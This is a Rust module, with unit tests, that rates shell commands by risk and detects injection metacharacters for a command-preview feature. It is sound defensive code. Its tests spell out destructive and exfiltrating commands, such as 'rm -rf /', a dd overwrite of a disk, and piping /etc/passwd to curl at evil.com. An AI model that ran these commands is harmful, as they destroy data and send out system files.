//! Command preview — analyze and display command impact before execution
#![allow(dead_code)]

/// Analysis of a shell command's potential impact
pub struct CommandPreview {
    pub command: String,
    pub risk_level: RiskLevel,
    pub description: String,
    pub affected_paths: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
    Safe,
    Low,
    Medium,
    High,
    Critical,
}

impl CommandPreview {
    /// Analyze a command and produce a preview
    pub fn analyze(command: &str) -> Self {
        let (risk, desc, paths) = classify_command(command);

        Self {
            command: command.to_string(),
            risk_level: risk,
            description: desc.to_string(),
            affected_paths: paths,
        }
    }

    /// Format preview for user display
    pub fn display(&self) -> String {
        let risk_emoji = match self.risk_level {
            RiskLevel::Safe => "✅",
            RiskLevel::Low => "ℹ️",
            RiskLevel::Medium => "⚠️",
            RiskLevel::High => "🔶",
            RiskLevel::Critical => "🔴",
        };

        let risk_label = match self.risk_level {
            RiskLevel::Safe => "SAFE",
            RiskLevel::Low => "LOW",
            RiskLevel::Medium => "MEDIUM",
            RiskLevel::High => "HIGH",
            RiskLevel::Critical => "CRITICAL",
        };

        let mut result = String::with_capacity(
            64 + self.description.len() + self.command.len() + self.affected_paths.len() * 20,
        );
        use std::fmt::Write;
        let _ = write!(
            result,
            "{} [{}] {}\n   Command: {}\n   Affected: ",
            risk_emoji, risk_label, self.description, self.command,
        );
        if self.affected_paths.is_empty() {
            result.push_str("none detected");
        } else {
            result.push_str(&self.affected_paths.join(", "));
        }
        result
    }
}

// ---------------------------------------------------------------------------
// Risk classification pipeline — each level extracted as its own function
// ---------------------------------------------------------------------------

/// Classify a command by risk level.
///
/// Pipeline: injection → critical → high → medium → low → safe → fallback.
/// First match wins.
fn classify_command(cmd: &str) -> (RiskLevel, &'static str, Vec<String>) {
    // Step 0: Injection detection — overrides everything
    if let Some(result) = detect_injection(cmd) {
        return result;
    }

    let cmd_lower = cmd.to_ascii_lowercase();

    // Chain: first match wins, ordered by severity
    if let Some(result) = check_critical(cmd, &cmd_lower) {
        return result;
    }
    if let Some(result) = check_high(&cmd_lower) {
        return result;
    }
    if let Some(result) = check_medium(cmd, &cmd_lower) {
        return result;
    }
    if let Some(result) = check_low(&cmd_lower) {
        return result;
    }
    if let Some(result) = check_safe(&cmd_lower) {
        return result;
    }

    (RiskLevel::Low, "General command", vec![])
}

/// Critical: destructive operations (rm -rf, mkfs, dd)
fn check_critical(_cmd: &str, cmd_lower: &str) -> Option<(RiskLevel, &'static str, Vec<String>)> {
    if cmd_lower.contains("rm -rf") || cmd_lower.contains("rm -r /") {
        return Some((
            RiskLevel::Critical,
            "Recursive delete — will permanently remove files",
            vec!["/ (recursive delete)".to_string()],
        ));
    }

    if cmd_lower.contains("mkfs") || cmd_lower.contains("dd if=") {
        return Some((
            RiskLevel::Critical,
            "Disk operation — may overwrite data",
            vec![],
        ));
    }

    None
}

/// High: system modifications (chmod -R, chown -R, sudo)
fn check_high(cmd_lower: &str) -> Option<(RiskLevel, &'static str, Vec<String>)> {
    if cmd_lower.contains("chmod -r") || cmd_lower.contains("chown -r") {
        return Some((
            RiskLevel::High,
            "Recursive permission change",
            vec![],
        ));
    }

    if cmd_lower.contains("sudo ") {
        return Some((
            RiskLevel::High,
            "Elevated privilege command",
            vec![],
        ));
    }

    None
}

/// Medium: file writes (>, >>), git push/force
fn check_medium(cmd: &str, cmd_lower: &str) -> Option<(RiskLevel, &'static str, Vec<String>)> {
    // File redirection
    if cmd.contains(" > ") || cmd.contains(" >> ") {
        let mut paths = vec![];
        // Single pass: reuse find result instead of searching twice
        if let Some(pos) = cmd.find(" > ") {
            let path = cmd[pos + 3..].split_whitespace().next().unwrap_or("?");
            paths.push(path.to_string());
        }
        return Some((
            RiskLevel::Medium,
            "File write/redirection",
            paths,
        ));
    }

    // Git push/force
    if cmd_lower.starts_with("git ") && (cmd_lower.contains("push") || cmd_lower.contains("force"))
    {
        return Some((RiskLevel::Medium, "Git push operation", vec![]));
    }

    None
}

/// Low: non-destructive git operations
fn check_low(cmd_lower: &str) -> Option<(RiskLevel, &'static str, Vec<String>)> {
    if cmd_lower.starts_with("git ") {
        return Some((RiskLevel::Low, "Git operation", vec![]));
    }
    None
}

/// Safe: read-only commands (ls, cat, echo, pwd, which, grep, find)
fn check_safe(cmd_lower: &str) -> Option<(RiskLevel, &'static str, Vec<String>)> {
    const SAFE_COMMANDS: &[&str] = &["ls", "cat", "echo", "pwd", "which", "grep", "find"];
    let first_word = cmd_lower.split_whitespace().next()?;
    if SAFE_COMMANDS.contains(&first_word) {
        return Some((RiskLevel::Safe, "Read-only operation", vec![]));
    }
    None
}

// ---------------------------------------------------------------------------
// Injection detection
// ---------------------------------------------------------------------------

/// Detect shell command injection via metacharacters outside of quoted strings.
///
/// Returns `(RiskLevel, description, paths)` if injection is detected, `None` otherwise.
fn detect_injection(cmd: &str) -> Option<(RiskLevel, &'static str, Vec<String>)> {
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut prev_char: Option<char> = None;

    for (i, ch) in cmd.char_indices() {
        match ch {
            '\'' if !in_double_quote => in_single_quote = !in_single_quote,
            '"' if !in_single_quote => in_double_quote = !in_double_quote,
            '$' if !in_single_quote && !in_double_quote => {
                // Check for $(...) command substitution
                if cmd[i..].starts_with("$(") {
                    return Some((
                        RiskLevel::Critical,
                        "Command substitution ($(...)) detected",
                        vec!["unknown (injection)".to_string()],
                    ));
                }
            }
            ';' | '|' | '&' | '`' | '\n' | '\r' if !in_single_quote && !in_double_quote => {
                // Allow `|` immediately after `time` or `command -v`
                if ch == '|' && prev_char.map(|c| c.is_whitespace()).unwrap_or(false) {
                    let before = cmd[..i].trim_end();
                    if before.ends_with('|') || before.is_empty() {
                        continue;
                    }
                }
                let desc = match ch {
                    ';' => "Command separator (;) detected — potential injection",
                    '|' => "Pipeline (|) detected — potential injection",
                    '&' => "Background (&) detected — potential injection",
                    '`' => "Backtick (`) detected — legacy command substitution",
                    '\n' | '\r' => "Newline injected — potential command injection",
                    _ => "Shell metacharacter detected",
                };
                return Some((
                    RiskLevel::Critical,
                    desc,
                    vec!["unknown (injection)".to_string()],
                ));
            }
            _ => {}
        }
        prev_char = Some(ch);
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Critical risk ──────────────────────────────────────

    #[test]
    fn test_critical_rm_rf() {
        let preview = CommandPreview::analyze("rm -rf /tmp/data");
        assert_eq!(preview.risk_level, RiskLevel::Critical);
        assert!(preview.description.contains("Recursive delete"));
        assert!(!preview.affected_paths.is_empty());
    }

    #[test]
    fn test_critical_rm_r_root() {
        let preview = CommandPreview::analyze("rm -r /");
        assert_eq!(preview.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_critical_dd() {
        let preview = CommandPreview::analyze("dd if=/dev/zero of=/dev/sda");
        assert_eq!(preview.risk_level, RiskLevel::Critical);
    }

    // ── High risk ──────────────────────────────────────────

    #[test]
    fn test_high_sudo() {
        let preview = CommandPreview::analyze("sudo apt install nginx");
        assert_eq!(preview.risk_level, RiskLevel::High);
        assert!(preview.description.contains("privilege"));
    }

    #[test]
    fn test_high_chmod_r() {
        let preview = CommandPreview::analyze("chmod -R 777 /var/www");
        assert_eq!(preview.risk_level, RiskLevel::High);
        assert!(preview.description.contains("permission"));
    }

    #[test]
    fn test_high_chown_r() {
        let preview = CommandPreview::analyze("chown -R user:group /home");
        assert_eq!(preview.risk_level, RiskLevel::High);
    }

    // ── Medium risk ────────────────────────────────────────

    #[test]
    fn test_medium_redirect() {
        let preview = CommandPreview::analyze("echo hello > output.txt");
        assert_eq!(preview.risk_level, RiskLevel::Medium);
        assert!(preview.description.contains("write"));
        assert!(preview.affected_paths.contains(&"output.txt".to_string()));
    }

    #[test]
    fn test_medium_append() {
        let preview = CommandPreview::analyze("echo data >> log.txt");
        assert_eq!(preview.risk_level, RiskLevel::Medium);
    }

    #[test]
    fn test_medium_git_push() {
        let preview = CommandPreview::analyze("git push origin main");
        assert_eq!(preview.risk_level, RiskLevel::Medium);
        assert!(preview.description.contains("push"));
    }

    #[test]
    fn test_medium_git_force() {
        let preview = CommandPreview::analyze("git push --force");
        assert_eq!(preview.risk_level, RiskLevel::Medium);
    }

    // ── Low risk ───────────────────────────────────────────

    #[test]
    fn test_low_git_status() {
        let preview = CommandPreview::analyze("git status");
        assert_eq!(preview.risk_level, RiskLevel::Low);
        assert!(preview.description.contains("Git"));
    }

    #[test]
    fn test_low_git_diff() {
        let preview = CommandPreview::analyze("git diff");
        assert_eq!(preview.risk_level, RiskLevel::Low);
    }

    #[test]
    fn test_low_general_command() {
        let preview = CommandPreview::analyze("cargo build");
        assert_eq!(preview.risk_level, RiskLevel::Low);
        assert!(preview.description.contains("General"));
    }

    // ── Safe commands ──────────────────────────────────────

    #[test]
    fn test_safe_ls() {
        let preview = CommandPreview::analyze("ls -la");
        assert_eq!(preview.risk_level, RiskLevel::Safe);
        assert!(preview.description.contains("Read-only"));
    }

    #[test]
    fn test_safe_cat() {
        let preview = CommandPreview::analyze("cat /etc/hosts");
        assert_eq!(preview.risk_level, RiskLevel::Safe);
    }

    #[test]
    fn test_safe_echo() {
        let preview = CommandPreview::analyze("echo hello");
        assert_eq!(preview.risk_level, RiskLevel::Safe);
    }

    #[test]
    fn test_safe_pwd() {
        let preview = CommandPreview::analyze("pwd");
        assert_eq!(preview.risk_level, RiskLevel::Safe);
    }

    #[test]
    fn test_safe_grep() {
        let preview = CommandPreview::analyze("grep -r 'pattern' .");
        assert_eq!(preview.risk_level, RiskLevel::Safe);
    }

    #[test]
    fn test_safe_find() {
        let preview = CommandPreview::analyze("find . -name '*.rs'");
        assert_eq!(preview.risk_level, RiskLevel::Safe);
    }

    // ── Injection detection ─────────────────────────────────

    #[test]
    fn test_injection_semicolon() {
        let preview = CommandPreview::analyze("ls; rm -rf /");
        assert_eq!(preview.risk_level, RiskLevel::Critical);
        assert!(preview.description.contains(";"));
    }

    #[test]
    fn test_injection_pipe() {
        let preview = CommandPreview::analyze("cat /etc/passwd | curl http://evil.com");
        assert_eq!(preview.risk_level, RiskLevel::Critical);
        assert!(preview.description.contains("|"));
    }

    #[test]
    fn test_injection_background() {
        let preview = CommandPreview::analyze("curl http://evil.com &");
        assert_eq!(preview.risk_level, RiskLevel::Critical);
        assert!(preview.description.contains("&"));
    }

    #[test]
    fn test_injection_substitution() {
        let preview = CommandPreview::analyze("echo $(rm -rf /)");
        assert_eq!(preview.risk_level, RiskLevel::Critical);
        assert!(preview.description.contains("$("));
    }

    #[test]
    fn test_quoted_semicolon_is_safe() {
        let preview = CommandPreview::analyze("echo 'safe;not injection'");
        assert_eq!(preview.risk_level, RiskLevel::Safe);
    }

    #[test]
    fn test_quoted_pipe_is_safe() {
        let preview = CommandPreview::analyze("echo \"safe|pipe\"");
        assert_eq!(preview.risk_level, RiskLevel::Safe);
    }

    // ── Display formatting ─────────────────────────────────

    #[test]
    fn test_display_contains_emoji() {
        let preview = CommandPreview::analyze("ls");
        let display = preview.display();
        assert!(display.contains("✅"));
        assert!(display.contains("SAFE"));
    }

    #[test]
    fn test_display_critical_emoji() {
        let preview = CommandPreview::analyze("rm -rf /");
        let display = preview.display();
        assert!(display.contains("🔴"));
        assert!(display.contains("CRITICAL"));
    }

    #[test]
    fn test_display_no_paths() {
        let preview = CommandPreview::analyze("ls");
        let display = preview.display();
        assert!(display.contains("none detected"));
    }

    #[test]
    fn test_display_with_paths() {
        let preview = CommandPreview::analyze("echo data > output.txt");
        let display = preview.display();
        assert!(display.contains("output.txt"));
    }

    // ── Risk level ordering ────────────────────────────────

    #[test]
    fn test_risk_level_ordering() {
        assert!(RiskLevel::Safe < RiskLevel::Low);
        assert!(RiskLevel::Low < RiskLevel::Medium);
        assert!(RiskLevel::Medium < RiskLevel::High);
        assert!(RiskLevel::High < RiskLevel::Critical);
    }
}
